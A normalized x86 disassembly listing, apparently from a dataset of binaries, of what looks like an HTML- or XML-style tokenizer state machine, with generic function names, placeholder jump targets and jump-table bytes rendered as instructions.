mov edx [ eax + 0x5c ]
mov edi [ edx + ecx * 4 - 0x4 ]
mov eax [ edi + 0x10 ]
push ebx
push eax
push esi
call sub_10030ff0
mov eax [ esi + 0x8 ]
add eax 0x3c
push eax
push esi
call sub_100690f0
mov [ edi + 0x10 ] eax
mov ebx [ esi + 0x8 ]
mov ecx [ ebx + 0x48 ]
lea eax [ ebx + 0x94 ]
push eax
mov [ edi + 0x14 ] ecx
mov [ ebp - 0x4 ] eax
call sub_10015610
sub eax [ ebx + 0x48 ]
mov edx [ edi + 0x14 ]
add esp 0x14
mov [ edi + 0x18 ] eax
cmp [ edx + eax - 0x1 ] 0xd
jne r-xdata
mov [ eax + 0x68 ] 0x0
mov eax [ esi + 0x8 ]
mov ecx [ eax + 0x3c ]
push ecx
push esi
call sub_10030ff0
mov edx [ esi + 0x8 ]
add edx 0x3c
push edx
push esi
call sub_1001c570
mov esi [ esi + 0x8 ]
lea eax [ esi + 0x50 ]
push eax
lea edi [ esi + 0x94 ]
push edi
call sub_10061790
push edi
call sub_10015610
add esp 0x1c
pop edi
mov [ esi + 0x48 ] eax
pop esi
mov esp ebp
pop ebp
retn
mov ecx [ ebx + 0x50 ]
mov [ edi + 0x34 ] ecx
mov edx [ ebx + 0x54 ]
mov ecx [ ebp - 0x4 ]
mov [ edi + 0x38 ] edx
mov eax [ ebx + 0x58 ]
mov [ edi + 0x3c ] eax
add edi 0x40
push edi
push ecx
call sub_10061790
mov edx [ esi + 0x8 ]
mov eax [ edx + 0x3c ]
push eax
push esi
call sub_10030ff0
mov ecx [ esi + 0x8 ]
add ecx 0x3c
push ecx
push esi
call sub_1001c570
mov esi [ esi + 0x8 ]
lea edx [ esi + 0x50 ]
push edx
lea edi [ esi + 0x94 ]
push edi
call sub_10061790
push edi
call sub_10015610
add esp 0x24
pop ebx
pop edi
mov [ esi + 0x48 ] eax
pop esi
mov esp ebp
pop ebp
retn
dec eax
mov [ edi + 0x18 ] eax
sub_10072f00
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push esi
test eax eax
je r-xdata
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_100722b0
mov eax [ ebp + 0x14 ]
push esi
xor esi esi
call sub_10072640
add esp 0x8
xor eax eax
pop esi
pop ebp
retn
cmp eax 0x26
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov edx [ ebp + 0xc ]
mov [ ecx ] 0x1
mov [ edx + 0x4 ] 0x1
mov eax 0x2
pop esi
pop ebp
retn
cmp eax 0x3c
je r-xdata
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
mov [ ecx ] 0x7
call sub_10072430
mov edx [ esi + 0x8 ]
add edx 0x10
push edx
push 0x3c
push esi
call sub_10062120
add esp 0xc
mov eax 0x2
pop esi
pop ebp
retn
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x8 ]
add eax 0x94
push eax
call sub_100081a0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_10072640
add esp 0x8
pop edi
mov eax 0x1
pop esi
pop ebp
retn
sub_10072fd0
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
inc eax
push esi
push edi
cmp eax 0x3d
ja r-xdata
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x8 ]
add eax 0x94
push eax
call sub_100081a0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_10072640
add esp 0x8
pop edi
mov eax 0x1
pop esi
pop ebp
retn
movzx eax [ eax + lookup_table_100730bc ]
jmp [ eax * 4 + jump_table_100730a8 ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx + 0x8 ]
mov eax [ ebp + 0xc ]
mov [ edx ] 0x3
pop edi
mov [ eax + 0x4 ] 0x1
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
mov [ ecx ] 0xa
call sub_10072430
mov edx [ esi + 0x8 ]
add edx 0x10
push edx
push 0x3c
push esi
call sub_10062120
add esp 0xc
pop edi
mov eax 0x2
pop esi
pop ebp
retn
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_100722b0
mov eax [ ebp + 0x14 ]
push esi
mov esi [ r--data ]
call sub_10072640
add esp 0x8
pop edi
xor eax eax
pop esi
pop ebp
retn
mov edi [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
mov [ edi ] 0x7
mov [ edi + 0x18 ] 0xffffffff
call sub_100724f0
pop edi
mov eax 0x1
pop esi
pop ebp
retn
sub_100730c1
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al [ esp + eax ]
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x4
add al 0x3
int3
sub_10073120
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push edi
cmp eax 0xffffffff
je r-xdata
mov edi [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
mov [ edi ] 0x7
mov [ edi + 0x18 ] 0xffffffff
call sub_100724f0
mov eax 0x1
pop edi
pop ebp
retn
push esi
test eax eax
je r-xdata
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_100722b0
mov eax [ ebp + 0x14 ]
push esi
mov esi [ r--data ]
call sub_10072640
add esp 0x8
pop esi
xor eax eax
pop edi
pop ebp
retn
cmp eax 0x3c
je r-xdata
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
mov [ ecx ] 0xd
call sub_10072430
mov edx [ esi + 0x8 ]
add edx 0x10
push edx
push 0x3c
push esi
call sub_10062120
add esp 0xc
pop esi
mov eax 0x2
pop edi
pop ebp
retn
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x8 ]
add eax 0x94
push eax
call sub_100081a0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_10072640
add esp 0x8
pop esi
mov eax 0x1
pop edi
pop ebp
retn
sub_100731e0
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push edi
cmp eax 0xffffffff
je r-xdata
mov edi [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
mov [ edi ] 0x7
mov [ edi + 0x18 ] 0xffffffff
call sub_100724f0
mov eax 0x1
pop edi
pop ebp
retn
push esi
test eax eax
je r-xdata
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_100722b0
mov eax [ ebp + 0x14 ]
push esi
mov esi [ r--data ]
call sub_10072640
add esp 0x8
pop esi
xor eax eax
pop edi
pop ebp
retn
cmp eax 0x3c
je r-xdata
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
mov [ ecx ] 0x10
call sub_10072430
mov edx [ esi + 0x8 ]
add edx 0x10
push edx
push 0x3c
push esi
call sub_10062120
add esp 0xc
pop esi
mov eax 0x2
pop edi
pop ebp
retn
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x8 ]
add eax 0x94
push eax
call sub_100081a0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_10072640
add esp 0x8
pop esi
mov eax 0x1
pop edi
pop ebp
retn
sub_100732a0
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push edi
cmp eax 0xffffffff
je r-xdata
mov edi [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
mov [ edi ] 0x7
mov [ edi + 0x18 ] 0xffffffff
call sub_100724f0
mov eax 0x1
pop edi
pop ebp
retn
push esi
test eax eax
je r-xdata
mov esi [ ebp + 0x8 ]
push 0x2
mov eax esi
call sub_100722b0
mov eax [ ebp + 0x14 ]
push esi
mov esi [ r--data ]
call sub_10072640
add esp 0x8
pop esi
xor eax eax
pop edi
pop ebp
retn
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x8 ]
add eax 0x94
push eax
call sub_100081a0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_10072640
add esp 0x8
pop esi
mov eax 0x1
pop edi
pop ebp
retn
sub_10073320
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push ebx
push esi
cmp eax 0x21
je r-xdata
mov esi [ ebp + 0x8 ]
mov edx [ esi + 0x8 ]
push edi
mov [ edx ] 0x2c
mov edi [ esi + 0x8 ]
lea eax [ edi + 0x94 ]
push eax
call sub_1003fdd0
lea ebx [ edi + 0x10 ]
push ebx
push esi
call sub_1001bc80
push ebx
push esi
call sub_1001c570
add edi 0x20
push edi
push esi
call sub_1001bc80
push edi
push esi
call sub_1001c570
add esp 0x24
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
cmp eax 0x2f
je r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x8 ]
mov [ edx ] 0x8
mov ecx [ eax + 0x8 ]
add ecx 0x10
push ecx
push 0x2f
push eax
call sub_10062120
add esp 0xc
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
cmp eax 0x3f
je r-xdata
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x8 ]
mov [ eax ] 0x2b
call sub_10072430
mov ecx [ esi + 0x8 ]
add ecx 0x10
push ecx
push 0x3f
push esi
call sub_10062120
push 0x8
mov eax esi
call sub_100722b0
add esp 0x10
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
cmp eax 0x41
jl r-xdata
add eax 0xffffff9f
cmp eax 0x19
ja r-xdata
cmp eax 0x5a
jle r-xdata
mov ebx [ ebp + 0x8 ]
push 0xa
mov eax ebx
call sub_100722b0
mov edx [ ebp + 0x14 ]
mov ecx [ ebx + 0x8 ]
push edx
mov [ ecx ] 0x0
call sub_100729e0
add esp 0x8
pop esi
xor eax eax
pop ebx
pop ebp
retn
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x8 ]
push 0x1
mov [ eax ] 0x9
call sub_10072a50
add esp 0x4
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
sub_10073440
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x10 ]
cmp edi 0xffffffff
je r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
push 0xc
mov eax ebx
call sub_100722b0
mov eax [ ebp + 0x14 ]
mov edx [ ebx + 0x8 ]
push eax
mov [ edx ] 0x0
call sub_100729e0
add esp 0x8
pop ebx
pop edi
pop ebp
retn
push esi
cmp edi 0x3e
je r-xdata
mov esi [ ebp + 0x8 ]
push 0xb
mov eax esi
call sub_100722b0
mov ecx [ esi + 0x8 ]
add esp 0x4
pop esi
mov [ ecx ] 0x0
mov eax 0x2
pop edi
pop ebp
retn
cmp edi 0x41
jl r-xdata
lea eax [ edi - 0x61 ]
cmp eax 0x19
ja r-xdata
cmp edi 0x5a
jle r-xdata
mov esi [ ebp + 0x8 ]
push 0xd
mov eax esi
call sub_100722b0
mov edx [ esi + 0x8 ]
mov [ edx ] 0x2b
call sub_10072430
mov eax [ esi + 0x8 ]
add eax 0x10
push eax
push edi
push esi
call sub_10062120
add esp 0x10
pop esi
mov eax 0x2
pop edi
pop ebp
retn
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
push 0x0
mov [ ecx ] 0x9
call sub_10072a50
add esp 0x4
pop esi
mov eax 0x2
pop edi
pop ebp
retn
sub_10073510
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push ebx
lea ecx [ eax + 0x1 ]
push esi
push edi
cmp ecx 0x3f
ja r-xdata
lea ecx [ eax - 0x41 ]
cmp ecx 0x19
ja r-xdata
movzx ecx [ ecx + lookup_table_1007367c ]
jmp [ ecx * 4 + jump_table_10073664 ]
mov edx [ ebp + 0x8 ]
mov esi [ edx + 0x8 ]
cmp [ esi + 0x40 ] 0x0
lea edi [ esi + 0x3c ]
mov [ ebp + 0x10 ] eax
jne r-xdata
add eax 0x20
mov esi [ ebp + 0x8 ]
call sub_10072af0
mov edx [ esi + 0x8 ]
pop edi
pop esi
mov [ edx ] 0x21
mov eax 0x2
pop ebx
pop ebp
retn
mov esi [ ebp + 0x8 ]
call sub_10072af0
mov eax [ esi + 0x8 ]
pop edi
pop esi
mov [ eax ] 0x2a
mov eax 0x2
pop ebx
pop ebp
retn
mov esi [ ebp + 0x8 ]
call sub_10072af0
mov ecx [ esi + 0x8 ]
mov edi [ ebp + 0x14 ]
push esi
mov [ ecx ] 0x0
call sub_10072770
add esp 0x4
pop edi
pop esi
pop ebx
pop ebp
retn
mov edi [ ebp + 0x8 ]
push 0x2
mov eax edi
call sub_100722b0
mov esi [ edi + 0x8 ]
mov edx [ r--data ]
lea ebx [ esi + 0x3c ]
add esp 0x4
cmp [ ebx + 0x4 ] 0x0
mov [ ebp + 0x10 ] edx
jne r-xdata
mov ebx [ ebp + 0x8 ]
push 0x9
mov eax ebx
call sub_100722b0
add esp 0x4
call sub_100728b0
mov eax [ ebx + 0x8 ]
pop edi
pop esi
mov [ eax ] 0x0
mov eax 0x2
pop ebx
pop ebp
retn
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0x8 ]
push edi
push ecx
push edx
call sub_10062120
add esp 0xc
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
lea eax [ esi + 0x50 ]
push eax
lea ebx [ esi + 0x94 ]
push ebx
call sub_10061790
push ebx
call sub_10015610
add esp 0xc
mov [ esi + 0x48 ] eax
mov edx [ ebp + 0x10 ]
push ebx
push edx
push edi
call sub_10062120
add esp 0xc
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
lea ecx [ esi + 0x50 ]
lea eax [ esi + 0x94 ]
push ecx
push eax
call sub_10061790
lea eax [ esi + 0x94 ]
push eax
call sub_10015610
add esp 0xc
mov [ esi + 0x48 ] eax
sub_10073682
add eax 0x2050505
add al [ 0x5050502 ]
add eax 0x5050505
add eax 0x5050505
add eax 0x5050505
add eax 0x5050502
add eax 0x5050505
add eax 0x5050505
add eax 0x5050503
add eax 0x5050505
add eax 0x5050505
add eax 0xcccccc04
int3
sub_100736c0
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x2f
jne r-xdata
mov edx [ ebp + 0x14 ]
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x8 ]
mov [ eax ] 0x2
push edx
mov [ ecx + 0x4 ] 0x1
call sub_100729e0
add esp 0x4
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov [ ecx ] 0xb
mov edx [ eax + 0x8 ]
add edx 0x10
push edx
push 0x2f
push eax
call sub_10062120
add esp 0xc
mov eax 0x2
pop ebp
retn
sub_10073720
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x10 ]
cmp edi 0x41
jl r-xdata
lea eax [ edi - 0x61 ]
cmp eax 0x19
ja r-xdata
cmp edi 0x5a
jle r-xdata
mov ecx [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x8 ]
push ecx
mov [ eax ] 0x2
call sub_100729e0
add esp 0x4
pop ebx
pop edi
pop ebp
retn
push esi
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
push 0x0
mov [ ecx ] 0xc
call sub_10072a50
mov edx [ esi + 0x8 ]
add edx 0x10
push edx
push edi
push esi
call sub_10062120
add esp 0x10
pop esi
mov eax 0x2
pop edi
pop ebp
retn
sub_10073790
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ebp + 0x10 ]
push esi
push edi
cmp ebx 0x41
jl r-xdata
lea eax [ ebx - 0x61 ]
cmp eax 0x19
ja r-xdata
cmp ebx 0x5a
jle r-xdata
mov esi [ ebp + 0x8 ]
mov edi [ esi + 0x8 ]
add edi 0x3c
push edi
push 0x0
push esi
call sub_10062120
dec [ edi + 0x4 ]
add esp 0xc
cmp [ edi + 0x34 ] 0x96
je r-xdata
lea ecx [ ebx - 0x41 ]
cmp ecx 0x19
ja r-xdata
mov eax [ esi + 0x8 ]
mov ebx esi
mov [ eax ] 0x2
call sub_100728b0
mov ecx [ ebp + 0x14 ]
push ecx
call sub_100729e0
add esp 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ edi ]
push ecx
call sub_10001080
add esp 0x4
cmp [ edi + 0x34 ] eax
jne r-xdata
mov [ ebp + 0x10 ] ebx
lea edx [ ebx + 0x20 ]
mov [ ebp + 0x10 ] edx
jmp r-xdata
lea eax [ ebx - 0x9 ]
cmp eax 0x35
ja r-xdata
mov edx [ ebp + 0x10 ]
push eax
push edx
push esi
call sub_10062120
mov eax [ esi + 0x8 ]
add eax 0x10
push eax
push ebx
push esi
call sub_10062120
add esp 0x18
pop edi
pop esi
mov eax 0x2
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ edi + 0x50 ]
lea eax [ edi + 0x94 ]
push ecx
push eax
call sub_10061790
lea eax [ edi + 0x94 ]
push eax
call sub_10015610
mov [ edi + 0x48 ] eax
mov eax [ ebp - 0x4 ]
add esp 0xc
mov esi [ ebp + 0x8 ]
mov edi [ esi + 0x8 ]
cmp [ edi + 0x40 ] 0x0
lea eax [ edi + 0x3c ]
mov [ ebp - 0x4 ] eax
jne r-xdata
movzx edx [ eax + lookup_table_100738f0 ]
jmp [ edx * 4 + jump_table_100738e0 ]
call sub_10072af0
mov eax [ esi + 0x8 ]
pop edi
pop esi
mov [ eax ] 0x21
mov eax 0x2
pop ebx
mov esp ebp
pop ebp
retn
call sub_10072af0
mov ecx [ esi + 0x8 ]
pop edi
pop esi
mov [ ecx ] 0x2a
mov eax 0x2
pop ebx
mov esp ebp
pop ebp
retn
call sub_10072af0
mov edx [ esi + 0x8 ]
mov edi [ ebp + 0x14 ]
push esi
mov [ edx ] 0x0
call sub_10072770
add esp 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_100738f4
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ eax ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add [ ebx ] eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ edx ]
int3
sub_10073930
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x2f
jne r-xdata
mov edx [ ebp + 0x14 ]
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x8 ]
mov [ eax ] 0x4
push edx
mov [ ecx + 0x4 ] 0x1
call sub_100729e0
add esp 0x4
pop ebx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov [ ecx ] 0xe
mov edx [ eax + 0x8 ]
add edx 0x10
push edx
push 0x2f
push eax
call sub_10062120
add esp 0xc
mov eax 0x2
pop ebp
retn
sub_10073990
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x10 ]
cmp edi 0x41
jl r-xdata
lea eax [ edi - 0x61 ]
cmp eax 0x19
ja r-xdata
cmp edi 0x5a
jle r-xdata
mov ecx [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x8 ]
push ecx
mov [ eax ] 0x4
call sub_100729e0
add esp 0x4
pop ebx
pop edi
pop ebp
retn
push esi
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
push 0x0
mov [ ecx ] 0xf
call sub_10072a50
mov edx [ esi + 0x8 ]
add edx 0x10
push edx
push edi
push esi
call sub_10062120
add esp 0x10
pop esi
mov eax 0x2
pop edi
pop ebp
retn
sub_10073a00
push ebp
mov ebp esp
mov eax [ ebp + 0xc ]
mov ecx [ eax + 0x3c ]
mov edx [ eax + 0x40 ]
push ebx
push esi
push edi
push ecx
push edx
push r--data
call sub_1001f980
mov ebx [ ebp + 0x10 ]
add esp 0xc
cmp ebx 0x41
jl r-xdata
lea eax [ ebx - 0x61 ]
cmp eax 0x19
ja r-xdata
cmp ebx 0x5a
jle r-xdata
mov esi [ ebp + 0x8 ]
mov edi [ esi + 0x8 ]
add edi 0x3c
push edi
push 0x0
push esi
call sub_10062120
dec [ edi + 0x4 ]
add esp 0xc
cmp [ edi + 0x34 ] 0x96
je r-xdata
lea ecx [ ebx - 0x41 ]
cmp ecx 0x19
ja r-xdata
mov eax [ esi + 0x8 ]
mov ebx esi
mov [ eax ] 0x4
call sub_100728b0
mov ecx [ ebp + 0x14 ]
push ecx
call sub_100729e0
add esp 0x4
pop edi
pop esi
pop ebx
pop ebp
retn
mov ecx [ edi ]
push ecx
call sub_10001080
add esp 0x4
cmp [ edi + 0x34 ] eax
jne r-xdata
mov [ ebp + 0xc ] ebx
lea edx [ ebx + 0x20 ]
mov [ ebp + 0xc ] edx
jmp r-xdata
push r--data
call sub_1001f980
lea eax [ ebx - 0x9 ]
add esp 0x4
cmp eax 0x35
ja r-xdata
mov edx [ ebp + 0xc ]
push eax
push edx
push esi
call sub_10062120
mov eax [ esi + 0x8 ]
add eax 0x10
push eax
push ebx
push esi
call sub_10062120
add esp 0x18
pop edi
pop esi
mov eax 0x2
pop ebx
pop ebp
retn
lea ecx [ edi + 0x50 ]
lea eax [ edi + 0x94 ]
push ecx
push eax
call sub_10061790
lea eax [ edi + 0x94 ]
push eax
call sub_10015610
mov [ edi + 0x48 ] eax
mov eax [ ebp + 0x10 ]
add esp 0xc
mov esi [ ebp + 0x8 ]
mov edi [ esi + 0x8 ]
cmp [ edi + 0x40 ] 0x0
lea eax [ edi + 0x3c ]
mov [ ebp + 0x10 ] eax
jne r-xdata
movzx edx [ eax + lookup_table_10073b7c ]
jmp [ edx * 4 + jump_table_10073b6c ]
call sub_10072af0
mov eax [ esi + 0x8 ]
pop edi
pop esi
mov [ eax ] 0x21
mov eax 0x2
pop ebx
pop ebp
retn
call sub_10072af0
mov ecx [ esi + 0x8 ]
pop edi
pop esi
mov [ ecx ] 0x2a
mov eax 0x2
pop ebx
pop ebp
retn
call sub_10072af0
mov edx [ esi + 0x8 ]
mov edi [ ebp + 0x14 ]
push esi
mov [ edx ] 0x0
call sub_10072770
add esp 0x4
pop edi
pop esi
pop ebx
pop ebp
retn
sub_10073b80
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ eax ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add [ ebx ] eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ edx ]
int3
sub_10073bc0
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
cmp eax 0x2f
jne r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
cmp eax 0x21
mov eax [ ebx + 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov [ ecx ] 0x11
mov edx [ eax + 0x8 ]
add edx 0x10
push edx
push 0x2f
push eax
call sub_10062120
add esp 0xc
mov eax 0x2
pop ebp
retn
mov edx [ ebp + 0x14 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] 0x5
push edx
mov [ ecx + 0x4 ] 0x1
call sub_100729e0
add esp 0x4
pop ebx
pop ebp
retn
mov [ eax ] 0x13
mov ecx [ ebx + 0x8 ]
add ecx 0x10
push ecx
push 0x21
push ebx
call sub_10062120
mov edx [ ebp + 0x14 ]
push edx
call sub_100729e0
add esp 0x10
pop ebx
pop ebp
retn
sub_10073c40
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x10 ]
cmp edi 0x41
jl r-xdata
lea eax [ edi - 0x61 ]
cmp eax 0x19
ja r-xdata
cmp edi 0x5a
jle r-xdata
mov ecx [ ebp + 0x14 ]
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x8 ]
push ecx
mov [ eax ] 0x5
call sub_100729e0
add esp 0x4
pop ebx
pop edi
pop ebp
retn
push esi
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
push 0x0
mov [ ecx ] 0x12
call sub_10072a50
mov edx [ esi + 0x8 ]
add edx 0x10
push edx
push edi
push esi
call sub_10062120
add esp 0x10
pop esi
mov eax 0x2
pop edi
pop ebp
retn
sub_10073cb0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ebp + 0x10 ]
push esi
push edi
cmp ebx 0x41
jl r-xdata
lea eax [ ebx - 0x61 ]
cmp eax 0x19
ja r-xdata
cmp ebx 0x5a
jle r-xdata
mov esi [ ebp + 0x8 ]
mov edi [ esi + 0x8 ]
add edi 0x3c
push edi
push 0x0
push esi
call sub_10062120
dec [ edi + 0x4 ]
add esp 0xc
cmp [ edi + 0x34 ] 0x96
je r-xdata
lea ecx [ ebx - 0x41 ]
cmp ecx 0x19
ja r-xdata
mov eax [ esi + 0x8 ]
mov ebx esi
mov [ eax ] 0x5
call sub_100728b0
mov ecx [ ebp + 0x14 ]
push ecx
call sub_100729e0
add esp 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ edi ]
push ecx
call sub_10001080
add esp 0x4
cmp [ edi + 0x34 ] eax
jne r-xdata
mov [ ebp + 0x10 ] ebx
lea edx [ ebx + 0x20 ]
mov [ ebp + 0x10 ] edx
jmp r-xdata
lea eax [ ebx - 0x9 ]
cmp eax 0x35
ja r-xdata
mov edx [ ebp + 0x10 ]
push eax
push edx
push esi
call sub_10062120
mov eax [ esi + 0x8 ]
add eax 0x10
push eax
push ebx
push esi
call sub_10062120
add esp 0x18
pop edi
pop esi
mov eax 0x2
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ edi + 0x50 ]
lea eax [ edi + 0x94 ]
push ecx
push eax
call sub_10061790
lea eax [ edi + 0x94 ]
push eax
call sub_10015610
mov [ edi + 0x48 ] eax
mov eax [ ebp - 0x4 ]
add esp 0xc
mov esi [ ebp + 0x8 ]
mov edi [ esi + 0x8 ]
cmp [ edi + 0x40 ] 0x0
lea eax [ edi + 0x3c ]
mov [ ebp - 0x4 ] eax
jne r-xdata
movzx edx [ eax + lookup_table_10073e10 ]
jmp [ edx * 4 + jump_table_10073e00 ]
call sub_10072af0
mov eax [ esi + 0x8 ]
pop edi
pop esi
mov [ eax ] 0x21
mov eax 0x2
pop ebx
mov esp ebp
pop ebp
retn
call sub_10072af0
mov ecx [ esi + 0x8 ]
pop edi
pop esi
mov [ ecx ] 0x2a
mov eax 0x2
pop ebx
mov esp ebp
pop ebp
retn
call sub_10072af0
mov edx [ esi + 0x8 ]
mov edi [ ebp + 0x14 ]
push esi
mov [ edx ] 0x0
call sub_10072770
add esp 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_10073e14
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ eax ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add [ ebx ] eax
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ ebx ]
add eax [ edx ]
int3
sub_10073e50
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x2d
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] 0x5
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
pop ebp
retn
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x8 ]
mov [ eax ] 0x14
mov ecx [ edi + 0x8 ]
add ecx 0x94
push ecx
call sub_100081a0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_10072640
add esp 0x8
pop edi
mov eax 0x1
pop esi
pop ebp
retn
sub_10073eb0
push ebp
mov ebp esp
cmp [ ebp + 0x10 ] 0x2d
jne r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] 0x5
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
pop ebp
retn
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x8 ]
mov [ eax ] 0x17
mov ecx [ edi + 0x8 ]
add ecx 0x94
push ecx
call sub_100081a0
mov esi eax
mov eax [ ebp + 0x14 ]
push edi
call sub_10072640
add esp 0x8
pop edi
mov eax 0x1
pop esi
pop ebp
retn
sub_10073f10
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x10 ]
lea eax [ edi + 0x1 ]
cmp eax 0x3d
ja r-xdata
mov edi [ ebp + 0x8 ]
movzx eax [ eax + lookup_table_10074000 ]
jmp [ eax * 4 + jump_table_10073fec ]
mov edi [ ebp + 0x8 ]
mov ecx [ edi + 0x8 ]
mov [ ecx ] 0x16
jmp r-xdata
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0x8 ]
mov [ eax ] 0x18
call sub_10072430
mov ecx [ esi + 0x8 ]
add ecx 0x10
push ecx
push edi
push esi
call sub_10062120
add esp 0xc
pop edi
mov eax 0x2
pop esi
pop ebp
retn
